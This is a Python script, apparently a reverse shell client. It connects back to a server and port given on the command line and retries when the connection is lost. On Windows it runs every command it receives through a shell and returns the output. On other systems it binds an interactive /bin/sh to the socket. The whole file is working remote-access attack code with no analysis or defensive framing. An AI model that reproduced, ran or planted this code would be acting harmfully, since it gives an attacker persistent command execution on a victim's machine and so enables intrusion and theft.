import os
import socket
import sys
import subprocess
import argparse
import time
from colorama import Fore,init

if sys.platform == 'win32' or sys.platform == 'win64':
    init(convert=True)

parser = argparse.ArgumentParser()

parser.add_argument('-s', '--server', type=str, metavar='', required=True, help='server to connect to')
parser.add_argument('-p', '--port', type=int, metavar='', required=True, help='port to connect to')
parser.add_argument('-r', '--retry', type=int, metavar='', help='set time between each retry if a connection is lost')
parser.add_argument('--max-retries',dest='retries', type=int, metavar='', help='set max number of times to retry forming a connection before exiting')

args = parser.parse_args()

loop = False

if args.retries and not args.retry:
    args.retry = 5
elif args.retry and not args.retries:
    loop = True
    args.retries = 0

server = args.server
port = args.port
retries = args.retries
retry = args.retry

s = None
hostname = ''
ip = ''
banner = ''
retry_counter = 1

def open_conn():
    try:
        global s
        global retry_counter
        global retries
        global retry

        if retries or retry:
            while (retries > 0) or (loop == True):

                retries = retries - 1
                s = socket.socket()
                print(Fore.LIGHTYELLOW_EX + '[+] Attempting to connect to ' + server + ' on port ' + str(port) + ' (atmpt #' + str(retry_counter) + ')' + Fore.RESET)

                try:
                    s.connect((server,port))
                    print(Fore.LIGHTYELLOW_EX + '[+] Successfully connected to ' + server + ' on port ' + str(port) + Fore.RESET)
                    retry_counter = 1
                    print(Fore.LIGHTYELLOW_EX + '[+] Sending a command prompt...' + Fore.RESET)
                    send_commands()
                    break

                except:
                    retry_counter = retry_counter + 1
                    print(Fore.LIGHTRED_EX + '[!] Could not connect to ' + server + ' on port ' + str(port) + Fore.RESET)
                    s.close() 
                    if retries or retry:
                        if retries > 0 or loop == True:
                            print(Fore.LIGHTYELLOW_EX + '[+] Waiting ' + str(retry) + ' second(s) until next attempt' + Fore.RESET)
                            time.sleep(retry)
        
        else:
            s = socket.socket()
            print(Fore.LIGHTYELLOW_EX + '[+] Attempting to connect to ' + server + ' on port ' + str(port) + Fore.RESET)
            try:
                s.connect((server,port))
                print(Fore.LIGHTYELLOW_EX + '[+] Successfully connected to ' + server + ' on port ' + str(port) + Fore.RESET)
                print(Fore.LIGHTYELLOW_EX + '[+] Sending a command prompt...' + Fore.RESET)
                send_commands()

            except:
                print(Fore.LIGHTRED_EX + '[!] Could not connect to ' + server + ' on port ' + str(port) + Fore.RESET)
                s.close() 
        
    except:
        s.close()
        print(Fore.LIGHTYELLOW_EX + '[!] Fatal Error. Exiting.' + Fore.RESET)
        sys.exit(0)


def send_commands():
    global retries
    global retry
    global args

    try:
        if sys.platform == 'win32' or sys.platform == 'win64':
            while True:
                try:
                    data = s.recv(1024)
                    if data[:2].decode('utf-8') == 'cd':
                        try:
                            os.chdir(data[3:].decode('utf-8').rstrip())
                            s.send(str.encode(os.getcwd() + '> '))
                        except:
                            s.send(str.encode('The system cannot find the path specified.\n\n' + os.getcwd() + '> '))

                    elif data.decode('utf-8') == '\n':
                        s.send(str.encode(os.getcwd() + '> '))
                    elif len(data) > 0:
                        cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        output = (cmd.stdout.read() + cmd.stderr.read()).decode('utf-8')
                        s.send(str.encode(output + '\n' + os.getcwd() + '> '))
                except Exception as e:
                    break
            #p=subprocess.call(["C:/Windows/System32/cmd.exe"])
        else:
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            p=subprocess.call(["/bin/sh","-i"])

    except:
        print(Fore.LIGHTRED_EX + '[!] Connection Error. Exiting.' + Fore.RESET)
    
    if retries or retry:
        retries = args.retries
        print(Fore.LIGHTRED_EX + '[!] Connection lost. Attempting to reconnect...' + Fore.RESET)
        open_conn()
    else:
        print(Fore.LIGHTYELLOW_EX + '[+] Session completed. Exiting.' + Fore.RESET)

open_conn()